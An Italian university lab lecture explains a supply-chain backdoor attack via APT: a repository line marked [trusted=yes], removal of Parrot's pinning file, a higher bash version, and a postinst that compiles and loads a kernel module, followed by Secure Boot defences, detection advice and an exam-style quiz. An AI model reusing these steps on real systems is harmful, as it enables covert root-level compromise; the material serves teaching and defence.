# Lezione — Modulo S7: LAB Backdoor injection

**Corso**: Lab Sicurezza Informatica T
**Tipo**: modulo di laboratorio (Security, esame pratico) — questa lezione estrae i *meccanismi* mostrati nel lab; non è il walkthrough passo-passo (quello sarebbe la guida-lab).
**Fonte**: `SLIDE LAB/SICINF/LAB_Backdoor_injection_15apr.html`
**Ambiente**: VM Parrot OS, con snapshot prima dell'esercizio (l'esperimento compromette il sistema).

---

## 0. Il quadro: perché un aggiornamento software è un vettore d'attacco

L'idea centrale del modulo è controintuitiva e va afferrata prima di ogni comando: **il canale con cui teniamo sicuro un sistema — l'aggiornamento dei pacchetti — è anche il canale con cui lo si può compromettere nel modo più profondo e silenzioso possibile.**

Un sistema Linux delega enorme fiducia al *package manager* (APT su Debian/Parrot/Ubuntu). Quando lanci `apt install` o `apt upgrade`, autorizzi del codice a:

- essere scaricato da una sorgente remota,
- essere installato **con privilegi di root**,
- **eseguire script arbitrari** durante l'installazione (non solo copiare file).

Se un attaccante riesce a far passare *un suo* pacchetto per un legittimo aggiornamento, ottiene esecuzione di codice come root sfruttando un meccanismo che l'utente considera fidato per definizione. È l'essenza di un attacco alla *supply chain*: non buchi il bersaglio, avveleni ciò di cui il bersaglio si fida.

> **Threat model in una riga.** Attaccante: trasformare il flusso di update in un veicolo di persistenza a livello kernel. Difensore: garantire che *solo* codice autenticato entri dal canale di update, e rilevare le alterazioni quando la prevenzione fallisce.

Il lab percorre questa catena in cinque tappe: (1) predisporre la sorgente malevola, (2) vincere la selezione della versione, (3) capire come il pacchetto esegue codice, (4) analizzare la backdoor consegnata, (5) capire quale difesa strutturale (Secure Boot + firma dei moduli) avrebbe fermato tutto.

---

## 1. Il canale di consegna: un repository APT malevolo

### Il comando

Come `root` sulla VM Parrot si crea una nuova sorgente APT:

```bash
# file /etc/apt/sources.list.d/evil.list
deb [trusted=yes] http://darma.ing.unibo.it/debian-repo ./
```

**Meccanismo.** Ogni riga `deb` dichiara ad APT "esiste un repository di pacchetti binari a questo URL". APT normalmente pretende che il repository sia **firmato crittograficamente** (GPG): scarica un file `Release`/`InRelease` firmato con una chiave che il sistema già conosce, e rifiuta i pacchetti se la firma non torna. Il campo di opzioni `[trusted=yes]` **disattiva esattamente questo controllo**: dice ad APT "fidati di questo repo anche se non è firmato con una chiave nota". È la chiave di volta dell'attacco — senza `[trusted=yes]`, APT rifiuterebbe l'installazione o darebbe un errore di autenticazione.

**Visione.** Per il difensore questa è la lezione operativa più importante del modulo: `[trusted=yes]` è il *disabilitatore della sicurezza dei repository*. Un attaccante che riesce a scrivere in `/etc/apt/sources.list.d/` (quindi che ha già una qualche forma di accesso privilegiato, o che inganna l'utente/uno script di setup) rende inutile tutta l'infrastruttura di firma di Debian con una sola opzione. La contromisura simmetrica: le sorgenti legittime si autenticano con `signed-by=/percorso/chiave.gpg`, mai con `[trusted=yes]`; e la comparsa di `[trusted=yes]` sotto `sources.list.d/` è un indicatore di compromissione da cercare attivamente.

### Neutralizzare la protezione di Parrot: l'apt pinning

```bash
mv /etc/apt/preferences.d/parrot-pinning /root
```

**Meccanismo.** Oltre alla firma, APT ha un secondo controllo: il **pinning** (le *preferences*). I file in `/etc/apt/preferences.d/` assegnano una **priorità** (Pin-Priority) alle sorgenti. Parrot spedisce un file `parrot-pinning` che dà ai propri repo ufficiali una priorità più alta del default: così, anche se un altro repo offrisse una versione più recente di un pacchetto, APT continuerebbe a preferire quella "ufficiale". Spostando via quel file, tutto torna alla priorità di default (500 per ogni sorgente abilitata) e a quel punto **vince semplicemente il numero di versione più alto**, ovunque si trovi.

**Visione.** Il lab lo dice esplicitamente: quel pinning "è una buona idea, ed eviterebbe l'infezione che vogliamo testare". La difesa esisteva già di serie e andava *disattivata a mano* perché l'attacco funzionasse. Questo chiarisce la differenza tra i due controlli APT, facilissimi da confondere:

- **Firma GPG** (che `[trusted=yes]` disabilita) = *autenticazione*: "questo pacchetto viene davvero da chi dice?".
- **Pinning / preferences** = *priorità*: "a parità di pacchetto, quale sorgente e quale versione scelgo?".

Sono ortogonali: la firma dice *se* un pacchetto è ammissibile, il pinning dice *quale* scegliere tra gli ammissibili. L'attacco deve sconfiggerli entrambi.

### Aggiornare gli indici

```bash
apt update
```

**Meccanismo.** `apt update` **non installa nulla**: scarica solo gli *indici* dei pacchetti da tutte le sorgenti, aggiornando l'elenco locale di "cosa è disponibile e in quale versione". Dopo questo comando APT sa che dal repo malevolo è disponibile una nuova versione di `bash`. (Distinzione da tenere ferma: `apt update` = aggiorna la *lista*; `apt upgrade` = installa gli aggiornamenti disponibili; `apt install <pkg>` = installa/aggiorna *un* pacchetto specifico.)

---

## 2. Vincere la selezione della versione

### Cosa succede

```bash
apt install bash
```

Il lab evidenzia il trucco numerico: il repo malevolo dichiara `bash` alla versione **5.2.37-2+b9**, contro la **5.2.37-2+b7 installata** e la **5.2.37-2+b8 del repo ufficiale**.

**Meccanismo.** Quando deve scegliere quale versione candidare, tra sorgenti a pari priorità APT **preferisce il numero di versione più alto**, con il confronto di `dpkg`: `+b9 > +b8 > +b7` (i `+bN` sono *binary rebuild*). L'attaccante non ha rotto nulla: gli è bastato pubblicare un numero *appena più alto* di quello ufficiale. Con il pinning rimosso (tappa 1) e la firma bypassata da `[trusted=yes]`, il pacchetto malevolo diventa il "candidato" naturale e `apt install bash` lo scarica come se fosse il legittimo aggiornamento di `bash`.

**Visione.** Qui c'è la mossa offensiva più elegante del modulo: l'attacco non si traveste da software sconosciuto, si traveste da **aggiornamento di un pacchetto che c'è già ed è essenziale** (`bash` è su ogni sistema). Il lab sottolinea due conseguenze per la furtività:

- Il pacchetto viene **aggiornato**, non installato ex-novo: con un `apt upgrade` questa singola operazione si sarebbe **mescolata all'aggiornamento di ~180 pacchetti**, quasi invisibile nel rumore.
- Con gli aggiornamenti automatici (unattended-upgrades) l'infezione potrebbe avvenire **in background**, senza che nessuno lanci un comando.

Per il difensore l'anomalia non è "un programma strano", è "`bash` viene aggiornato da una sorgente non ufficiale a una versione che l'upstream non ha mai rilasciato". I log APT (`/var/log/apt/history.log`, `/var/log/dpkg.log`) e la provenienza (`apt-cache policy bash`) sono i punti dove questa incoerenza è visibile.

---

## 3. Anatomia del pacchetto: come un `.deb` esegue codice

È il cuore teorico del modulo. Il lab elenca quattro fatti; vanno letti sul modello del pacchetto Debian.

### Un `.deb` non è solo file: contiene script che girano come root

Un pacchetto Debian è un archivio con, semplificando, due parti: i **file da installare** (il *data*, che finisce sul filesystem) e le **informazioni di controllo** (il *control*), tra cui i **maintainer scripts**: `preinst`, `postinst`, `prerm`, `postrm`. Sono script (di solito shell) che `dpkg` esegue *automaticamente* prima/dopo l'installazione o la rimozione — **come root**, perché l'installazione dei pacchetti gira come root.

Il lab lo mostra esplicitamente:

> "l'installazione non ha semplicemente copiato file, ma anche eseguito codice, in particolare:
> ```bash
> cd /usr/share/badmodule
> make
> insmod ./root.ko
> ```"

**Meccanismo.** Questi tre comandi non li digita l'utente: stanno nel `postinst` del pacchetto malevolo, e `dpkg` li esegue da solo al termine dell'installazione, con privilegi di root. `cd /usr/share/badmodule` entra nella cartella con i sorgenti del payload (piazzati dal *data* del pacchetto); `make` **compila** il modulo kernel sulla macchina bersaglio; `insmod ./root.ko` **carica il modulo compilato dentro il kernel in esecuzione**. In tre righe il pacchetto è passato da "installo software" a "inietto codice in ring 0".

**Visione.** Il maintainer script è una funzionalità *legittima e necessaria* di APT/dpkg (crea utenti di sistema, avvia demoni, compila moduli DKMS...). L'attacco non sfrutta un bug: sfrutta il *design*. Per questo il canale di update è così potente come vettore — l'esecuzione di codice arbitrario come root al momento dell'installazione è *prevista*. Cade quindi l'illusione che "un pacchetto è solo un insieme di file": accettare un pacchetto significa accettare di eseguirne gli script come root.

### Il gestore delle dipendenze è complice

```
Depends: base-files (>= 2.1.12), debianutils (>= 5.6-0.1), build-essential, linux-headers-amd64
```

**Meccanismo.** Il campo `Depends` elenca ciò che deve essere presente perché il pacchetto funzioni; APT lo risolve e installa in automatico le dipendenze mancanti. Qui l'attaccante ha aggiunto `build-essential` (compilatore `gcc`, `make`, ...) e `linux-headers-amd64` (gli header del kernel). Non sono dipendenze "vere" di `bash`: servono al **payload**, perché per compilare (`make`) e caricare (`insmod`) un modulo kernel servono compilatore e header del kernel *in esecuzione*. L'attaccante **coopta il risolutore di dipendenze** per farsi installare da solo gli strumenti con cui costruirà la backdoor sul bersaglio.

**Visione.** Perché compilare sul bersaglio invece di consegnare un `.ko` già pronto? Perché un modulo kernel deve corrispondere *esattamente* alla versione del kernel su cui viene caricato (di questo parla la tappa 4): compilare *in loco* contro gli header locali garantisce compatibilità su qualunque VM, rendendo l'attacco portabile. Per il difensore è un ottimo segnale d'allarme: un aggiornamento di `bash` che tira dietro `build-essential` e `linux-headers` è **assurdo** — `bash` non si compila all'installazione. Dipendenze incoerenti con la natura del pacchetto sono un red flag.

### L'installazione avviene con privilegi di root, quindi senza limiti

Il lab chiude la sezione ricordandolo: tutto quanto sopra (script + compilazione + `insmod`) gira come root. Non c'è sandbox, non c'è confinamento: chi controlla il pacchetto controlla la macchina.

---

## 4. Anatomia della backdoor: il modulo kernel

Il lab qui è volutamente scarno ("Analizziamo insieme il payload, che l'attaccante ha lasciato in `/usr/share/badmodule/`"), perché l'analisi si fa in aula sul file. Ma i meccanismi da conoscere per il quiz sono quelli del **Loadable Kernel Module (LKM)**.

**Meccanismo.** Un LKM è codice che viene caricato **dentro il kernel Linux a runtime**, senza riavviare, ed esegue in *ring 0* — lo stesso livello di privilegio del kernel stesso. Gli strumenti:

- `insmod ./root.ko` — inserisce un modulo (`.ko` = *kernel object*) indicandone il file esatto;
- `lsmod` / `cat /proc/modules` — elenca i moduli caricati;
- `rmmod` — rimuove un modulo;
- `make` + `linux-headers-amd64` + `build-essential` — la toolchain per produrre il `.ko` compatibile col kernel corrente.

Il `make` legge un `Makefile` nella cartella del payload che invoca il build system del kernel usando gli header installati; il risultato è `root.ko`, poi caricato da `insmod`.

**Visione (perché una backdoor a livello kernel è il peggio per il difensore).** Un backdoor *userspace* (un processo, un cron job, una shell) vive sopra il kernel e può essere visto e ucciso con gli strumenti normali. Un backdoor **kernel** vive *dentro* l'osservatore: può intercettare le system call (hooking), **nascondere sé stesso** da `lsmod`, nascondere processi da `ps`, file da `ls`, connessioni da `ss`/`netstat` — perché è proprio quel codice a rispondere alle domande degli strumenti di ispezione. È la base tecnica dei *rootkit* kernel. Persistenza + invisibilità + privilegio massimo: per questo l'attaccante investe nel farsi caricare un modulo invece di lasciare uno script.

Per il difensore, di conseguenza, gli strumenti userspace (`ps`, `lsmod`) diventano inaffidabili una volta che il modulo è dentro: la difesa deve agire *prima* (impedire il caricamento) o *da fuori* (confronto d'integrità offline, di cui sotto).

---

## 5. La difesa strutturale: Secure Boot e firma dei moduli

### Cosa dice il lab

> "L'iniezione ha effetto perché Parrot parte **senza Secure boot**, quindi è possibile caricare kernel e relativi moduli anche se non sono autenticati. [...] su un sistema che lo supporta (es. VM Ubuntu) [...] anche se la software injection ha successo, il modulo backdoor non viene caricato."

**Meccanismo.** Ci sono due controlli, distinti ma collegati:

1. **Secure Boot** (UEFI): il firmware verifica la firma di ogni anello della catena d'avvio (bootloader → kernel), rifiutando ciò che non è firmato da una chiave presente nel suo database. Garantisce che parta *un kernel autentico*.
2. **Firma dei moduli** (module signing): con Secure Boot attivo il kernel entra in modalità *lockdown* e applica `module.sig_enforce`, cioè **rifiuta di caricare moduli non firmati** con una chiave fidata (nel db UEFI o registrata come MOK, *Machine Owner Key*). `insmod ./root.ko` su un modulo non firmato fallisce con un errore tipo `Key was rejected by service`.

Il punto chiave: **la software injection riesce lo stesso** (il pacchetto si installa, `make` compila) — ma l'ultimo passo, `insmod`, viene **bloccato dal kernel** perché il modulo non è firmato. La catena si spezza sull'ultimo anello.

**Visione.** Questo separa nettamente due livelli di difesa e spiega perché Parrot è vulnerabile e Ubuntu no *a parità di attacco*:

- Impedire l'**ingresso** del pacchetto (firma APT, pinning) è la difesa di tappa 1–2.
- Impedire l'**effetto finale** (firma dei moduli sotto Secure Boot) è una difesa indipendente che scatta *anche se le prime hanno fallito*: è difesa in profondità. Parrot non può avviarsi in Secure Boot (limite della distro), quindi manca proprio questo strato ed è il motivo per cui il lab funziona lì.

Contromisure equivalenti quando Secure Boot non è disponibile: disabilitare del tutto il caricamento dei moduli a runtime dopo il boot (`sysctl kernel.modules_disabled=1`), o il kernel *lockdown* in modalità confinamento.

---

## 6. Threat model consolidato

### Prospettiva dell'attaccante — la kill chain del modulo

1. **Accesso al canale**: scrivere una sorgente APT malevola (`evil.list`) con `[trusted=yes]` → bypassa l'autenticazione GPG.
2. **Rimuovere gli ostacoli**: spostare l'apt pinning → il repo malevolo torna a pari priorità.
3. **Vincere la selezione**: versione `+b9` più alta dell'ufficiale `+b8` → APT candida il pacchetto malevolo.
4. **Esecuzione come root**: il `postinst` esegue `make` + `insmod`; `Depends` si tira dietro `build-essential`/`linux-headers`.
5. **Persistenza invisibile**: modulo kernel `root.ko` in ring 0, potenzialmente auto-occultante.
6. **Furtività**: `bash` è core e "aggiornato" → l'operazione si mimetizza tra ~180 update o in background.

### Prospettiva del difensore — prevenzione e rilevazione

**Prevenzione (impedire):**
- Mai `[trusted=yes]`; autenticare i repo con `signed-by=` e chiavi GPG note.
- Mantenere il pinning e la lista sorgenti sotto controllo (integrità di `/etc/apt/`).
- Secure Boot + `module.sig_enforce`, oppure `kernel.modules_disabled=1` a boot completato.
- Disabilitare gli aggiornamenti automatici da sorgenti non verificate.

**Rilevazione (accorgersi):**
- Controllare la provenienza: `apt-cache policy bash` mostra da quale repo arriva il candidato; i log `/var/log/apt/history.log` e `/var/log/dpkg.log` registrano l'operazione.
- **Integrity check su filesystem** (vedi S11): un baseline noto-buono di `/usr/bin`, `/usr/share`, `/lib/modules` confrontato dopo l'update rileva i file nuovi (`/usr/share/badmodule/`, il `root.ko`) e il `bash` sostituito.
- Attenzione al limite: `debsums` verifica i file *contro il manifest del pacchetto stesso*; siccome il pacchetto malevolo è coerente col proprio manifest, `debsums` **non** lo segnala. Un integrity checker con baseline indipendente (AIDE) sì. È una distinzione importante: verificare "contro ciò che il pacchetto dichiara" ≠ verificare "contro uno stato noto-buono precedente".
- Una volta caricato il modulo, `lsmod`/`ps` possono essere ingannati: la rilevazione affidabile è *offline* o *da baseline esterna*.

---

## 7. Connessioni con altri moduli

- **S11 — Integrity check e privilege escalation (già svolto in profondità, lab `change1`…`change5`).** Il collegamento è diretto e verificabile. In S11 la *strategia difensiva* era esattamente: configurare **AIDE** per una scansione del sottoalbero `/usr/bin`, creare il database sul sistema pulito, lanciare il comando "malware", rilanciare AIDE in confronto per rilevare la modifica (là scoprivi che `cp` aveva preso il **bit SUID**). La stessa identica metodologia è la difesa di rilevazione qui: baseline AIDE *prima* di `apt install bash`, confronto dopo → emergono `/usr/share/badmodule/`, il `root.ko` e il `bash` sostituito. Sul versante offensivo, S11 e S7 sono due facce della persistenza dell'attaccante: in S11 il privilegio si ottiene/mantiene in **userspace** (SUID su `cp`, poi scrittura di un utente `toor` uid 0 in `/etc/passwd`+`/etc/shadow`); in S7 la persistenza sale al **kernel** (LKM), che è più profonda e più difficile da rilevare proprio perché può occultarsi agli strumenti userspace che in S11 usavi per indagare.
- **S10 — Network Intrusion Detection (già svolto, Wireshark + Suricata).** Due punti di contatto concreti. (1) Il pacchetto malevolo viene scaricato via **`http://` in chiaro** da `darma.ing.unibo.it`: un NIDS/monitor di rete può segnalare un fetch APT verso un repository non ufficiale. (2) Una backdoor kernel apre tipicamente un canale di comando (bind/reverse shell, C2): è esattamente il traffico anomalo *dopo* la compromissione che un NIDS come Suricata è pensato per rilevare — dove l'integrity check (S11) guarda il disco, il NIDS guarda la rete.
- **S5 — Firewall (iptables/nftables).** Complementare in prevenzione: un firewall in uscita (default-deny sull'egress) che limiti le destinazioni degli update potrebbe bloccare la connessione al repo malevolo, e regole d'uscita restrittive ostacolerebbero il callback C2 della backdoor. Firewall = prevenzione perimetrale, NIDS = rilevazione, integrity check = rilevazione a terra: tre strati sullo stesso incidente.

---

## 8. Autoverifica — quiz teorico (stile esame: vero/falso e scelta multipla)

> Rispondi *prima* di guardare le soluzioni in fondo. Ricorda che nel quiz d'esame le risposte sbagliate penalizzano: se un'affermazione ti è davvero ignota, valuta se astenerti.

1. **V/F** — `apt update` può installare o aggiornare un pacchetto sulla macchina.
2. **V/F** — L'opzione `[trusted=yes]` in una riga `deb` fa sì che APT verifichi la firma GPG del repository con maggiore severità.
3. **V/F** — Rimuovere `/etc/apt/preferences.d/parrot-pinning` serve a bypassare la *firma* dei pacchetti.
4. **Scelta multipla** — Il pacchetto malevolo riesce a essere scelto da APT come candidato principalmente perché:
   (a) è firmato con la chiave ufficiale di Parrot;
   (b) dichiara una versione (`+b9`) più alta di quella installata (`+b7`) e di quella ufficiale (`+b8`), con pinning rimosso e firma bypassata;
   (c) `apt install bash` forza sempre l'ultima versione da qualsiasi repo ignorando la priorità;
   (d) `bash` non era installato e quindi va preso dal primo repo disponibile.
5. **V/F** — L'esecuzione di codice all'installazione (`make`, `insmod`) avviene tramite i *maintainer scripts* del pacchetto (es. `postinst`), eseguiti da `dpkg` come root.
6. **Scelta multipla** — Perché il pacchetto dichiara `Depends: build-essential, linux-headers-amd64`?
   (a) sono dipendenze reali di `bash`;
   (b) servono a compilare (`make`) e caricare (`insmod`) il modulo kernel sul bersaglio, e APT le installa in automatico;
   (c) servono a firmare il modulo per Secure Boot;
   (d) sono richieste da `apt update`.
7. **V/F** — Un modulo kernel malevolo (`root.ko`) esegue in ring 0 e può nascondersi da `lsmod` e nascondere processi/file/connessioni agli strumenti userspace.
8. **V/F** — Con Secure Boot attivo e `module.sig_enforce`, l'installazione del pacchetto malevolo verrebbe bloccata già in fase di `apt install`.
9. **Scelta multipla** — Quale controllo *non* segnalerebbe il pacchetto malevolo, perché verifica i file contro il manifest del pacchetto stesso?
   (a) AIDE con baseline sul sistema pulito;
   (b) `debsums`;
   (c) `apt-cache policy`;
   (d) confronto offline degli hash.
10. **V/F** — Poiché Parrot non può avviarsi in Secure Boot, in quel sistema manca lo strato che rifiuta i moduli non firmati, ed è il motivo per cui l'`insmod` del lab riesce.

### Soluzioni

1. **Falso** — `apt update` scarica solo gli *indici*; non installa nulla. Installa `apt upgrade`/`apt install`.
2. **Falso** — al contrario, `[trusted=yes]` **disattiva** la verifica della firma: fa fidare APT di un repo non autenticato.
3. **Falso** — il pinning riguarda la *priorità/selezione della versione*, non l'autenticazione. La firma la si bypassa con `[trusted=yes]`. Sono i due controlli ortogonali da non confondere.
4. **(b)** — pari priorità (pinning rimosso) + firma bypassata + versione più alta ⇒ candidato scelto.
5. **Vero** — è il meccanismo centrale: i maintainer scripts girano come root all'installazione.
6. **(b)** — dipendenze cooptate per costruire il modulo in loco; incoerenti con `bash`, quindi anche un red flag difensivo.
7. **Vero** — è la natura del rootkit kernel: sta *dentro* l'osservatore.
8. **Falso** — l'installazione (e la compilazione) **riescono**; è l'ultimo passo `insmod` a essere **bloccato dal kernel** perché il modulo non è firmato. La catena si spezza sull'`insmod`, non sull'`apt install`.
9. **(b)** — `debsums` confronta i file col manifest del *pacchetto stesso*, con cui il malware è coerente; serve una baseline indipendente (AIDE, S11).
10. **Vero** — è esattamente ciò che afferma il lab: manca la firma dei moduli perché manca Secure Boot.

---

## 9. In sintesi

La backdoor injection di questo lab è un attacco alla *catena di fiducia del package manager*, in cinque anelli: **(1)** sorgente non autenticata via `[trusted=yes]`, **(2)** pinning rimosso, **(3)** versione più alta per vincere la selezione, **(4)** esecuzione come root nel `postinst` che compila e carica un **modulo kernel** (con `build-essential`/`linux-headers` tirati dentro dalle `Depends`), **(5)** persistenza invisibile in ring 0. Ogni anello ha una difesa: repo firmati e pinning (1–2), coerenza/provenienza dei pacchetti (3), consapevolezza che installare = eseguire codice root (4), e la barriera strutturale finale della **firma dei moduli sotto Secure Boot** (5), assente su Parrot. La rilevazione a posteriori si appoggia all'integrity check con baseline indipendente (AIDE, come in S11), non a `debsums` né agli strumenti userspace che il modulo può ingannare.

<!-- AUTO-LINKS:START -->
<!-- AUTO-LINKS:END -->
